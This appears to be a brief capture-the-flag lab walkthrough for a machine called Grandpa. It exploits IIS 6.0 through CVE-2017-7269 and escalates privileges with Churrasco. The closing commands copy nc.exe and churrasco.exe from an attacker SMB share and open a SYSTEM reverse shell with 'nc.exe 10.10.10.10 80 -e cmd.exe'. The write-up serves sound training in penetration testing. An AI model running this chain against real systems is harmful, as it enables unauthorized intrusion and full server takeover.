# Grandpa

### Reconnaissance

- port 80/tcp Microsoft IIS 6.0

WebDAV server with PUT allowed but no uploads are possible when tested with davtest (no write permissions in 
the wwwroot directory)

No interesting directories discovered from enumeration

### Exploitation

IIS 6.0 is vulnerable to CVE-2017-7269, this nice script here https://github.com/crypticdante/CVE-2017-7269 
gives us a reverse shell

Finding a directory was challenging, strange directory C:\wmpub was writable

### Privilege Escalation

SeImpersonatePrivileges + old OS = churrasco https://github.com/Re4son/Churrasco/

Use Impacket's smbserver.py for file uploads (ftp and certutil fail)

`python2.7 smbserver.py share .`

```
copy \\10.10.10.10\share\nc.exe .
copy \\10.10.10.10\share\churrasco.exe .
.\churrasco.exe -d "C:\wmpub\nc.exe 10.10.10.10 80 -e cmd.exe
```
